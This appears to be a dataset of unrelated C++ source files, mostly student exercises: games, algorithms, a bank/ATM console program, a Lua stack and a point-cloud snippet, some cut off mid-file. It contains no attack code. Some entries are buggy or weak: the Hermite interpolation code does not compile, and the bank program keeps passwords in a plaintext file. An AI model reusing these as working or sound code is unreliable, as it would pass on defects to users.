    "\ufeff\n\n#include <iostream>\nclass arr_error : public std::exception\n{\n\tstd::string message;\npublic:\n\tarr_error(const std::string& message) : message { message } {}\n\tconst char* what() const noexcept override\n\t{\n\t\treturn message.c_str();\n\t}\n};\nclass smart_array \n{\n\tint num_of_arr;\n\tint* arr=nullptr;\n\tint count{0};\npublic: \n\tsmart_array(int c) \n\t{\n\t\tnum_of_arr = c;\n\t\tint* arr_some = new int[num_of_arr] {};\n\t\tdelete[] arr;\n\t\tarr = arr_some;\n\t}\n\t~smart_array() { delete[] arr; }\n\n\tvoid add_element(int c)\n\t{\n\t\tif (count >= num_of_arr) \n\t\t{\n\t\t\tthrow arr_error(\"Array out of bonds\");\n\t\t\treturn;\n\t\t}\n\t\tarr[count] = c;\n\t\tcount++;\n\t}\n\tint get_element(int c) \n\t{ \n\t\tif (c > num_of_arr)\n\t\t{\n\t\t\tthrow arr_error(\"Wrong index\");\n\t\t\treturn -1;\n\t\t}\n\t\tc--;\n\t\treturn arr[c]; \n\t}\n};\n\nint main()\n{\n\ttry {\n\t\tsmart_array arr(5);\n\t\tarr.add_element(1);\n\t\tarr.add_element(4);\n\t\tarr.add_element(155);\n\t\tarr.add_element(14);\n\t\tarr.add_element(15);\n\n\t\tstd::cout << arr.get_element(1) << std::endl;\n\t\t\n\t}\n\tcatch (const std::exception& ex) {\n\t\tstd::cout << ex.what() << std::endl;\n\t}\n}",
    "#include <iostream>\n#include <fstream>\n#include <bits/stdc++.h>\nusing namespace std;\n\nint main(void)\n{\n    ifstream inFile;\n    string fileName;\n\n    cout << \"Unesite ime datoteke: \";\n    cin >> fileName;\n    inFile.open(fileName);\n    if (!inFile)\n    {\n        cerr << \"Unable to open file\";\n        exit(1);\n    }\n\n    int n;\n    inFile >> n;\n    int array[n][n];\n\n    int x;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            inFile >> x;\n            array[i][j] = x;\n        }\n    }\n    inFile.close();\n\n    int a[n];\n    for (int i = 0; i < n; i++)\n    {\n        a[i] = i;\n    }\n\n    bool exists = false;\n    int length = 0;\n    for (int j = 0; n - j > 2 && !exists; j++) {\n        sort(a, a + n);\n\n        do {\n            exists = true;\n\n            for (int i = 0; i < n - j; i++) {\n                if (i == n - j - 1) {\n                    if (!array[a[0]][a[i]]) {\n                        exists = false;\n                    }\n                } else {\n                    if (!array[a[i]][a[i + 1]]) {\n                        exists = false;\n                        break;\n                    }\n                }\n            }\n            \n            if (exists) length = n - j;\n        } while (!exists && next_permutation(a, a + n));\n    }\n\n    for (int i = 0; i < n; i++) {\n        cout << a[i] << \" \";\n    }\n    cout << endl << length;\n\n    return 0;\n}",
    "// PA4 Draft CAP4710.cpp : Defines the entry point for the application.\n//\n\n#include \"framework.h\"\n#include \"snakeGame.h\"\n#include \"openGLPart.h\"\n#include <sstream>\n\n#define MAX_LOADSTRING 100\nHBITMAP g_hbmBall = NULL;\n// Global Variables:\nHINSTANCE hInst;                                // current instance\nWCHAR szTitle[MAX_LOADSTRING];                  // The title bar text\nWCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name\n\n// Forward declarations of functions included in this code module:\nATOM                MyRegisterClass(HINSTANCE hInstance);\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\n\nint APIENTRY wWinMain(_In_ HINSTANCE hInstance,\n                     _In_opt_ HINSTANCE hPrevInstance,\n                     _In_ LPWSTR    lpCmdLine,\n                     _In_ int       nCmdShow)\n{\n    UNREFERENCED_PARAMETER(hPrevInstance);\n    UNREFERENCED_PARAMETER(lpCmdLine);\n\n    // TODO: Place code here.\n\n    // Initialize global strings\n    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);\n    LoadStringW(hInstance, IDC_PA4DRAFTCAP4710, szWindowClass, MAX_LOADSTRING);\n    MyRegisterClass(hInstance);\n\n    // Perform application initialization:\n    if (!InitInstance (hInstance, nCmdShow))\n    {\n        return FALSE;\n    }\n\n    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_PA4DRAFTCAP4710));\n\n    MSG msg;\n\n    // Main message loop:\n    while (GetMessage(&msg, nullptr, 0, 0))\n    {\n        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))\n        {\n            TranslateMessage(&msg);\n            DispatchMessage(&msg);\n        }\n    }\n\n    return (int) msg.wParam;\n}\n\n//\n//  FUNCTION: MyRegisterClass()\n//\n//  PURPOSE: Registers the window class.\n//\nATOM MyRegisterClass(HINSTANCE hInstance)\n{\n    WNDCLASSEXW wcex;\n\n    wcex.cbSize = sizeof(WNDCLASSEX);\n\n    wcex.style          = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc    = WndProc;\n    wcex.cbClsExtra     = 0;\n    wcex.cbWndExtra     = 0;\n    wcex.hInstance      = hInstance;\n    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_PA4DRAFTCAP4710));\n    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);\n    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);\n    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_PA4DRAFTCAP4710);\n    wcex.lpszClassName  = szWindowClass;\n    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));\n\n    return RegisterClassExW(&wcex);\n}\n\n//\n//   FUNCTION: InitInstance(HINSTANCE, int)\n//\n//   PURPOSE: Saves instance handle and creates main window\n//\n//   COMMENTS:\n//\n//  \n//       In this function, we save the instance handle in a global variable and\n//        create and display the main program window.\n//\nBOOL InitInstance(HINSTANCE hInstance, int nCmdShow)\n{\n   hInst = hInstance; // Store instance handle in our global variable\n\n   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,\n      CW_USEDEFAULT, 0, 830, 870, nullptr, nullptr, hInstance, nullptr);\n\n   if (!hWnd)\n   {\n      return FALSE;\n   }\n\n   ShowWindow(hWnd, nCmdShow);\n   UpdateWindow(hWnd);\n\n   bunnyColor = DEFAULT_BUNNY_COLOR;\n   bunnyCount = DEFAULT_NUMBER_OF_BUNNIES;\n   bunnySize = DEFAULT_BUNNY_SIZE;\n\n   snakeColor = DEFAULT_SNAKE_COLOR;\n   snakeSpeed = DEFAULT_SPEED;\n   snakeSize = DEFAULT_THICKNESS;\n\n   return TRUE;\n}\n\nINT_PTR CALLBACK PickNumberOfBunnies(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    int bc = DEFAULT_NUMBER_OF_BUNNIES;\n    std::stringstream ss;\n    {\n        TCHAR buffer[MAX_PATH];\n        switch (message)\n        {\n        case WM_COMMAND:\n            int x = LOWORD(wParam);\n            switch (x)\n            {\n            case IDOK:\n                GetDlgItemText(hDlg, IDC_EDIT1, buffer, sizeof(buffer));\n                try {\n                    bunnyCount = stoi(buffer);\n                    if (bunnyCount < 1 || bunnyCount>=50) {\n                        break;\n                    }\n                }\n                catch(...){\n                    break;\n                }\n            case IDCANCEL:\n                EndDialog(hDlg, wParam);\n                return TRUE;\n            }\n        }\n    }\n    return (INT_PTR)FALSE;\n}\n\n//\n//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)\n//\n//  PURPOSE: Processes messages for the main window.\n//\n//  WM_COMMAND  - process the application menu\n//  WM_PAINT    - Paint the main window\n//  WM_DESTROY  - post a quit message and return\n//\n//\nLRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n    switch (message)\n    {\n    case WM_CREATE:\n        g_hbmBall = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BITMAP1));\n        break;\n    case WM_COMMAND:\n        {\n            int wmId = LOWORD(wParam);\n            // Parse the menu selections:\n            switch (wmId)\n            {\n            case IDM_ABOUT:\n                DialogBox(hInst, M",
    "#include <iostream>\n#include <thread>\n#include <queue>\n#include <mutex>\n#include <condition_variable>\n#include <chrono>\n#include <random>\nusing namespace std;\n\nstruct requestStructure {\n    int request_id;\n    string ip_address;\n    string page_requested;\n};\n\nqueue<requestStructure> msg_queue;\nmutex mtx;\ncondition_variable cv;\nint request_counter = 0;\n\nstring webPages[10] = {\"google.com\", \"yahoo.com\", \"bing.com\", \"amazon.com\", \"facebook.com\", \n                       \"twitter.com\", \"instagram.com\", \"reddit.com\", \"linkedin.com\", \"netflix.com\"};\n\nvoid listen() {\n    while (true) {\n        this_thread::sleep_for(chrono::seconds(rand() % 3 + 1));\n        requestStructure req;\n        req.request_id = ++request_counter;\n        req.ip_address = \"\";\n        req.page_requested = webPages[rand() % 10];\n\n        {\n            lock_guard<mutex> lock(mtx);\n            msg_queue.push(req);\n        }\n\n        cv.notify_one();\n    }\n}\n\nvoid do_request(int thread_id) {\n    while (true) {\n        unique_lock<mutex> lock(mtx);\n        cv.wait(lock, [] { return !msg_queue.empty(); });\n\n        requestStructure req = msg_queue.front();\n        msg_queue.pop();\n\n        lock.unlock();\n\n        {\n            lock_guard<mutex> cout_lock(mtx);\n            cout << \"Thread \" << thread_id << \" completed request \" << req.request_id \n                 << \" requesting webpage \" << req.page_requested << endl;\n        }\n    }\n}\n\nint main() {\n    srand(time(nullptr));\n\n    thread listener(listen);\n\n    const int num_threads = 5;\n    thread threads[num_threads];\n\n    for (int i = 0; i < num_threads; ++i) {\n        threads[i] = thread(do_request, i + 1);\n    }\n\n    listener.join();\n\n    for (int i = 0; i < num_threads; ++i) {\n        threads[i].join();\n    }\n\n    return 0;\n}\n",
    "//! LeetCode Question 237. Delete Node in a Linked List\r\n\r\n//? link: https://leetcode.com/problems/delete-node-in-a-linked-list/description/?envType=daily-question&envId=2024-05-05\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nstruct ListNode {\r\n    int val;\r\n    ListNode *next;\r\n    ListNode(int x) : val(x), next(NULL) {}\r\n};\r\nclass Solution {\r\npublic:\r\n    void deleteNode(ListNode* node) {\r\n        node->val=node->next->val;\r\n        node->next=node->next->next;\r\n    }\r\n};\r\nint main() {\r\n    // Creating a linked list: 1 -> 2 -> 3 -> 4 -> 5\r\n    ListNode* head = new ListNode(1);\r\n    head->next = new ListNode(2);\r\n    head->next->next = new ListNode(3);\r\n    head->next->next->next = new ListNode(4);\r\n    head->next->next->next->next = new ListNode(5);\r\n\r\n    // Deleting the node with value 3\r\n    Solution sol;\r\n    ListNode* nodeToDelete = head->next->next; // Node with value 3\r\n    sol.deleteNode(nodeToDelete);\r\n\r\n    // Printing the modified linked list\r\n    ListNode* current = head;\r\n    while (current != nullptr) {\r\n        std::cout << current->val << \" \";\r\n        current = current->next;\r\n    }\r\n\r\n    // Clean up: Deleting all nodes to prevent memory leaks\r\n    current = head;\r\n    while (current != nullptr) {\r\n        ListNode* temp = current;\r\n        current = current->next;\r\n        delete temp;\r\n    }\r\n    return 0;\r\n}",
    "#include \"bullet.h\"\n#include <QGraphicsItem>\n#include <QTimer>\n#include <qmath.h>\n#include \"game.h\"\n\nextern game* game;\n\nBullet::Bullet(QGraphicsItem* parent) {\n    setPixmap(QPixmap(\":/new/prefix1/pngwing.com.png\").scaled(50,50));\n\n    QTimer* bullet_time = new QTimer(this);\n    connect(bullet_time,SIGNAL(timeout()),this,SLOT(move()));\n    bullet_time->start(50);\n}\n\n\n\nvoid Bullet::move(){\n    int speed = 20.0;\n\n    if(pos().y()>250 && pos().x()>375){\n        double dx = qCos(qDegreesToRadians(rotation())) * speed;\n        double dy = qSin(qDegreesToRadians(rotation())) * speed;\n\n        setPos(pos().x() + dx, pos().y() + dy);\n    }\n    else if(pos().y()<250 && pos().x()<400){\n       double dx = -qCos(qDegreesToRadians(rotation())) * speed;\n       double dy = -qSin(qDegreesToRadians(rotation())) * speed;\n\n        setPos(pos().x() + dx, pos().y() + dy);\n    }\n    else if(pos().y()<250 && pos().x()>400){\n        double dx = qCos(qDegreesToRadians(rotation())) * speed;\n        double dy = -qSin(qDegreesToRadians(rotation())) * speed;\n\n        setPos(pos().x() + dx, pos().y() + dy);\n    }\n    else if(pos().y()>250 && pos().x()<400){\n        double dx = -qCos(qDegreesToRadians(rotation())) * speed;\n        double dy = qSin(qDegreesToRadians(rotation())) * speed;\n\n        setPos(pos().x() + dx, pos().y() + dy);\n    }\n    else if(pos().x() == 350 && pos().y() == 200){\n        double dx = qCos(90) * speed;\n        double dy = qSin(90) * speed;;\n\n        setPos(pos().x() + dx, pos().y() + dy);\n    }\n    if (pos().y() + pixmap().height() < 0 || pos().y() > scene()->height() ||\n        pos().x() + pixmap().width() < 0 || pos().x() > scene()->width()) {\n        scene()->removeItem(this);\n        delete this;\n    }\n\n    QList<QGraphicsItem*>colliding_items = collidingItems();\n    for(int i = 0, n = colliding_items.size(); i < n; ++i){\n        if(typeid(*(colliding_items[i])) == typeid(Enemy)){\n            scene()->removeItem(colliding_items[i]);\n            scene()->removeItem(this);\n            delete colliding_items[i];\n            delete this;\n            return;\n        }\n    }\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nint main() {\n  const int CITY = 2;\n  const int WEEK = 7;\n\n  int temperature[CITY][WEEK];\n\n  // Part 1: Static input data\n  int staticData[CITY][WEEK] = {\n      {52, 54, 50, 58, 62, 60, 61}, // New York City\n      {72, 74, 70, 76, 78, 75, 77}  // Los Angeles\n  };\n\n  // Copying static data into temperature array\n  for (int i = 0; i < CITY; ++i) {\n    for (int j = 0; j < WEEK; ++j) {\n      temperature[i][j] = staticData[i][j];\n    }\n  }\n\n  cout << \"Displaying Static Values:\\n\";\n  // Displaying static data\n  for (int i = 0; i < CITY; ++i) {\n    for (int j = 0; j < WEEK; ++j) {\n      cout << ((i == 0) ? \"New York City\" : \"Los Angeles\") << \", Day \"\n           << ((j == 0)   ? \"Monday\"\n               : (j == 1) ? \"Tuesday\"\n               : (j == 2) ? \"Wednesday\"\n               : (j == 3) ? \"Thursday\"\n               : (j == 4) ? \"Friday\"\n               : (j == 5) ? \"Saturday\"\n                          : \"Sunday\")\n           << \" = \" << temperature[i][j] << endl;\n    }\n  }\n\n  // Part 2: User input data\n  cout << \"\\nEnter all temperature for a week of New York City and then Los \"\n          \"Angeles. \\n\";\n\n  for (int i = 0; i < CITY; ++i) {\n    for (int j = 0; j < WEEK; ++j) {\n      cout << ((i == 0) ? \"New York City\" : \"Los Angeles\") << \", Day \"\n           << ((j == 0)   ? \"Monday\"\n               : (j == 1) ? \"Tuesday\"\n               : (j == 2) ? \"Wednesday\"\n               : (j == 3) ? \"Thursday\"\n               : (j == 4) ? \"Friday\"\n               : (j == 5) ? \"Saturday\"\n                          : \"Sunday\")\n           << \" : \";\n      cin >> temperature[i][j];\n    }\n  }\n\n  cout << \"\\n\\nDisplaying User Input Values:\\n\";\n\n  // Displaying user input data\n  for (int i = 0; i < CITY; ++i) {\n    for (int j = 0; j < WEEK; ++j) {\n      cout << ((i == 0) ? \"New York City\" : \"Los Angeles\") << \", Day \"\n           << ((j == 0)   ? \"Monday\"\n               : (j == 1) ? \"Tuesday\"\n               : (j == 2) ? \"Wednesday\"\n               : (j == 3) ? \"Thursday\"\n               : (j == 4) ? \"Friday\"\n               : (j == 5) ? \"Saturday\"\n                          : \"Sunday\")\n           << \" = \" << temperature[i][j] << endl;\n    }\n  }\n\n  // Extra credit: Storing city temperatures in separate arrays\n  int cityOne[WEEK];\n  int cityTwo[WEEK];\n\n  // Copying data into separate arrays\n  for (int j = 0; j < WEEK; ++j) {\n    cityOne[j] = temperature[0][j];\n    cityTwo[j] = temperature[1][j];\n  }\n\n  cout << \"\\n\\nDisplaying City Temperatures from Separate Arrays:\\n\";\n\n  // Displaying city temperatures from separate arrays\n  cout << \"New York City temperatures: \";\n  for (int i = 0; i < WEEK; ++i) {\n    cout << cityOne[i] << \" \";\n  }\n  cout << endl;\n\n  cout << \"Los Angeles temperatures: \";\n  for (int i = 0; i < WEEK; ++i) {\n    cout << cityTwo[i] << \" \";\n  }\n  cout << endl;\n\n  return 0;\n}\n",
    "#include \"mainwindow.h\"\n\n#include <QMap>\n#include <QDebug>\n\n#include <QApplication>\n\nQString readTextFile(const QString& path) {\n  QFile file(path);\n\n  if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n    QTextStream in(&file);\n    return in.readAll();\n  }\n\n  return \"\";\n\n}\n\nint\nmain (int argc, char *argv[]) {\n  QApplication a (argc, argv);\n\n  MainWindow w;\n\n  // --- \u0421\u0442\u0438\u043b\u0438\u0437\u0443\u0435\u043c \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435\n\n  QMap<QString, QString> colors;\n\n  colors[\"@bg\"] = \"#F0F2E3\";\n  colors[\"@list_view\"] = \"#FAFAEE\";\n  colors[\"@scroll_color\"] = \"#B4CCBB\";\n  colors[\"@accent\"] = \"#58C084\";\n  colors[\"@btn\"] = \"#FFD7E6\";\n  colors[\"@on_btn\"] = \"#8F4664\";\n  colors[\"@field\"] = \"#E3ECD9\";\n  colors[\"@border_color\"] = \"#586249\";\n  colors[\"@text\"] = \"#1A1C16\";\n  colors[\"@border_width\"] = \"2px\";\n  colors[\"@padding\"] = \"3px\";\n  colors[\"@tab_padding\"] = \"12px\";\n  colors[\"@vertical_scroll_bar_height\"] = \"18px\";\n  colors[\"@vertical_scroll_bar_border_radius\"] = \"5px\";\n  colors[\"@control_size\"] = \"36px\";\n\n  QString css = readTextFile(\":/styles/style.css\");\n  if (!css.isEmpty()) {\n    for (const auto& color : colors.keys()) {\n      css.replace(color, colors[color]);\n    }\n    qDebug() << css;\n    a.setStyleSheet(css);\n  }\n\n  w.show ();\n  return a.exec ();\n}\n",
    "#include <iostream>\n#include <conio.h>\n#include <stdio.h>\n#include <fstream>\n#include <string>\n#include <windows.h>\nusing namespace std;\nclass Bank\n{\nprivate:\n    int id, ps;\n    fstream file;\n    string name, userData;\n\npublic:\n    void display();\n    Bank()\n\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n\n    ~Bank()\n    {\n        file.close();\n    }\n    void Invalid();\n    int menu();\n    void run_menu();\n    void singUp();\n    void new_user();\n    void LogIn();\n\n} b;\nclass B\n{\nprivate:\n    int *balance;\n    string userData;\n    fstream file;\n\npublic:\n    B()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n        balance = new int(100);\n    }\n    ~B()\n    {\n        // file.close();\n        delete balance;\n    }\n    int bank_managment();\n    void run_bank();\n    void deposit();\n    void withdraw();\n    void Payment();\n    int *get();\n} bm;\nclass atm\n{\nprivate:\n    string userData;\n    fstream file;\n\npublic:\n    atm()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n    ~atm()\n    {\n        file.close();\n    }\n    void log_atm();\n    int atm_management();\n    void run();\n} a;\n\nvoid star()\n{\n    cout << \"===============================================================================\\n\";\n}\nint main()\n{\n    system(\"cls\");\n    b.run_menu();\n\n    return 0;\n}\n//////////////////////////////class Bank//////////////////////////\nint Bank::menu()\n{\n    int choice;\n    cout << \"\\t\\t\\t control panle \\n\\n\";\n    star();\n    cout << \"1.Bank management \\n\";\n    cout << \"2.Atm management \\n\";\n    cout << \"3.Exit \\n\";\n    cout << \"Enter your choic  \";\n    cin >> choice;\n    star();\n    return choice;\n}\nvoid Bank::run_menu()\n{\n    //  system(\"cls\");\n    int c = menu();\n    if (c == 1)\n    {\n        LogIn();\n        // bm.run_bank();\n        // // break;\n    }\n    else if (c == 2)\n    {\n        a.run();\n    }\n    else if (c == 3)\n    {\n        exit(0);\n    }\n    else\n    {\n        cout << \"Invalid choice tray agine \\n\";\n    }\n}\nvoid Bank::singUp()\n{\n    string user_name;\n    int ps, pin;\n\n    cout << \"sing up in Account \\n\";\n    cout << \"User name  \";\n    cin >> user_name;\n    cout << \"\\nID \\n\";\n    cin >> pin;\n\n    cout << \"\\nEnter password\\n\";\n    cin >> ps;\n\n    file << user_name << \" \" << pin << \" \" << ps << \"\\n\";\n}\nvoid Bank::LogIn()\n{\n    star();\n    cout << \"Enter your name ,id ,password\\n\";\n    cin >> name >> id >> ps;\n    // b.Invalid();\n    string namee;\n    int iD, pass;\n    bool found = false;\n    // Loop through the file to check data\n    while (file >> namee >> iD >> pass)\n    {\n        if (name == namee && id == iD && ps == pass)\n        {\n            found = true;\n            break;\n        }\n    }\n\n    file.close();\n\n    if (found)\n    {\n        cout << \"\\n\\t\\tLogin successful\\n\";\n        star();\n        bm.run_bank();\n    }\n    else\n    {\n        cout << \"\\nError: Incorrect username, ID, or password\\n\";\n    }\n}\nvoid Bank::new_user()\n{\n\n    // system(\"cls\");\n    fstream file(\"userData.txt\", ios::in | ios::app | ios::out);\n    if (!file.is_open())\n    {\n        cerr << \"Error: Unable to open file userData.txt\\n\";\n        return;\n    }\n    cout << \"\\t\\t\\tAdd New User\\n\";\n    star();\n    cout << \"User name  \";\n\n    cin >> b.name;\n\n    cout << \"\\nUser ID  \";\n    cin >> b.id;\n\n    cout << \"\\nUser Password  \";\n    cin >> b.ps;\n\n    file << b.name << \" \" << b.id << \" \" << b.ps << \"\\n\";\n}\n/// //////////////////////// //////////////////////////////////////////////\nvoid B::deposit()\n{\n\n    int newblance;\n    cout << \"enter value\\n\";\n    cin >> newblance;\n    //  int* x=&newblance;\n    *balance += newblance;\n}\nvoid B::withdraw()\n{\n\n    int newblance;\n    while (true)\n    {\n\n        cout << \"enter value\\n\";\n        cin >> newblance;\n        // int *x=&newblance;\n        if (newblance > *balance)\n        {\n            cout << \"Eror your balance is less than value you want to withdraw\\n\";\n        }\n        else\n        {\n            *balance -= newblance;\n            break;\n        }\n    }\n}\nint *B::get()\n{\n\n    return balance;\n}\nvoid B::Payment()\n{\n    int u_id, B_amount,pas;\n    string B_name;\n    fstream file;\n    SYSTEMTIME X{};\n    cout << \"\\t\\tPayment Optine \\n\";\n    star();\n    cout << \"Enter Bill name \\n\";\n    cin >> B_name;\n    cout << \"Enter User iD \\n\";\n    c",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <functional>\n\nstd::vector<double> Hermite(std::vector<double> x, std::vector<double> y, std::vector<double> der1, std::vector<double> der2, std::vector<int> der1_coord, std::vector<int> der2_coord) {\n    int n = x.size() + der1.size() + der2.size();\n    std::vector<double> a(n);\n    std::vector<double> H;\n    std::vector<double> derH;\n    std::vector<double> der2H;\n    double x0;\n    double h = a[0];\n    for (int i = 1; i < n; i++) {\n        h += a[i] * pow(x0, i);\n    }\n    std::function<double(double)> H = [&](double x0) { return h; };\n    std::function<double(double)> dH = [&](double x0) { return h.diff(x0); };\n    std::function<double(double)> d2H = [&](double x0) { return dH.diff(x0); };\n    std::vector<double> eq;\n    return eq;\n}\n\nint main() {\n    std::vector<double> x;\n    std::vector<double> y;\n    std::vector<double> der1;\n    std::vector<double> der2;\n    int N;\n    std::cin >> N;\n    for (int i = 0; i < N; i++) {\n        double x0;\n        std::cin >> x0;\n        x.push_back(x0);\n    }\n    for (int i = 0; i < N; i++) {\n        double y0;\n        std::cin >> y0;\n        y.push_back(y0);\n    }\n    std::vector<int> der1_coord;\n    std::vector<int> der2_coord;\n    int N1;\n    std::cin >> N1;\n    for (int i = 0; i < N1; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der1_coord.push_back(point - 1);\n        der1.push_back(der);\n    }\n    int N2;\n    std::cin >> N2;\n    for (int i = 0; i < N2; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der2_coord.push_back(point - 1);\n        der2.push_back(der);\n    }\n    std::vector<double> result = Hermite(x, y, der1, der2, der1_coord, der2_coord);\n    for (int i = 0; i < result.size(); i++) {\n        std::cout << result[i] << std::endl;\n    }\n    return 0;\n}",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nint N;\n\n// Function for printing the solution\nvoid printSol(vector<vector<int>> board) {\n    for(int i = 0; i < N; i++) {\n        for(int j = 0; j < N; j++) {\n            cout << board[i][j] << \" \";\n        }\n        cout << \"\\n\";\n    }\n}\n\n// Optimized isSafe function to check if current row, left diagonal, or right diagonal contains any queen\nbool isSafe(int row, int col, vector<bool>& rows, vector<bool>& left_digonals, vector<bool>& right_digonals) {\n    if (rows[row] || left_digonals[row + col] || right_digonals[row - col + N - 1]) {\n        return false;\n    }\n    return true;\n}\n\n// Recursive function to solve N-queen Problem\nbool solve(vector<vector<int>>& board, int col, vector<bool>& rows, vector<bool>& left_digonals, vector<bool>& right_digonals) {\n    // Base Case: If all Queens are placed\n    if (col >= N) {\n        return true;\n    }\n    // Consider this Column and move in all rows one by one\n    for(int i = 0; i < N; i++) {\n        if (isSafe(i, col, rows, left_digonals, right_digonals)) {\n            rows[i] = true;\n            left_digonals[i + col] = true;\n            right_digonals[i - col + N - 1] = true;\n            board[i][col] = 1; // Placing the Queen in board[i][col]\n            // Recur to place rest of the queens\n            if (solve(board, col + 1, rows, left_digonals, right_digonals)) {\n                return true;\n            }\n            // Backtracking\n            board[i][col] = 0; // Removing the Queen from board[i][col]\n            rows[i] = false;\n            left_digonals[i + col] = false;\n            right_digonals[i - col + N - 1] = false;\n        }\n    }\n    return false;\n}\n\nint main() {\n    // Taking input from the user\n    cout << \"Enter the number of rows for the square Board : \";\n    cin >> N;\n    // Board of size N*N\n    vector<vector<int>> board(N, vector<int>(N, 0));\n    // Arrays to tell which rows and diagonals are occupied\n    vector<bool> rows(N, false);\n    vector<bool> left_digonals(2 * N - 1, false);\n    vector<bool> right_digonals(2 * N - 1, false);\n    bool ans = solve(board, 0, rows, left_digonals, right_digonals);\n    if (ans) {\n        // Printing the solution Board\n        printSol(board);\n    } else {\n        cout << \"Solution Does not Exist\\n\";\n    }\n}\n",
    "/*********************************************\n// Created by m1556 on 2024/4/11.\n*********************************************/\n#include <iostream>\n#include \"lua_stack.h\"\n\n\nLuaStack *newLuaStack(int size){\n    return new LuaStack(size);\n}\n\nLuaStack::LuaStack() = default;\n\nLuaStack::LuaStack(int n) {\n    this->slots.reserve(n);\n    this->top = 0;\n    for (int i = 0; i < n; ++i) {\n        this->slots.push_back(nullptr);\n    }\n}\n\nLuaStack::~LuaStack() {\n    for (auto & slot : this->slots) {\n            delete slot;\n    }\n}\n\nint LuaStack::getTop() {\n    return this->top;\n}\n\nvoid LuaStack::check(int n) {\n    int free = this->slots.size() - this->top;\n    if (n > free){\n        this->slots.resize(this->slots.size() + n - free, new Lua_value<void *>());\n    }\n}\n\nvoid LuaStack::push(Lua_type *val) {\n    if (this->top == this->slots.size()){\n        std::cerr << \"Stack overflow!\" << std::endl;\n        exit(1);\n    }\n    this->slots[this->top] = val;\n    this->top ++;\n}\n\nLua_type *LuaStack::pop() {\n    if (this->top < 1){\n        std::cerr << \"stack underflow!\" << std::endl;\n        exit(1);\n    }\n    this->top --;\n    Lua_type *val = this->slots[this->top];\n    this->slots[this->top] = nullptr;\n    return val;\n}\n\nint LuaStack::absIndex(int idx) {\n    if (idx >= 0){\n        return idx;\n    }\n    return idx + this->top + 1;\n}\n\nbool LuaStack::isValid(int idx) {\n    int absIdx = this->absIndex(idx);\n    return (absIdx > 0) && (absIdx <= this->top);\n}\n\nLua_type *LuaStack::get(int idx) {\n    int absIdx = this->absIndex(idx);\n    if (absIdx > 0 && absIdx <= this->top){\n        return this->slots[absIdx - 1];\n    }\n    return nullptr;\n}\n\nvoid LuaStack::set(int idx, Lua_type *val) {\n    int absIdx = this->absIndex(idx);\n    if (absIdx > 0 && absIdx <= this->top){\n        if (this->slots[absIdx - 1] != nullptr){\n            // delete original object\n            delete this->slots[absIdx - 1];\n        }\n        this->slots[absIdx - 1] = val;\n        return;\n    }\n    std::cerr << \"invalid index!\" << std::endl;\n    exit(1);\n}\n\nvoid LuaStack::reverse(int from, int to) {\n    Lua_type *pType;\n    while (from < to){\n        pType = this->slots[to];\n        this->slots[to] = this->slots[from];\n        this->slots[from] = pType;\n        from ++;\n        to --;\n    }\n}\n",
    "#include <iostream>\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n#include <pcl/features/normal_3d.h>\n#include <pcl/visualization/cloud_viewer.h>\n\nvoid viewerOneOff(pcl::visualization::PCLVisualizer& viewer)\n{\n\tviewer.setBackgroundColor(1, 0.5, 1);\n}\n\nint main(int argc, char** argv)\n{\n\tpcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n\n\tif (pcl::io::loadPCDFile<pcl::PointXYZ>(\"C://Users//19002//Desktop//data//biwi_face_database//model.pcd\", *cloud) == -1)\n\t{\n\t\treturn -1;\n\t}\n\n\tstd::cout << cloud->points.size() << std::endl;\n\n\n\t// Create the normal estimation class, and pass the input dataset to it\n\tpcl::NormalEstimation<pcl::PointXYZ, pcl::Normal> ne;\n\tne.setInputCloud(cloud);\n\n\t// Create an empty kdtree representation, and pass it to the normal estimation object.\n    // Its content will be filled inside the object, based on the given input dataset (as no other search surface is given).\n\tpcl::search::KdTree<pcl::PointXYZ>::Ptr tree(new 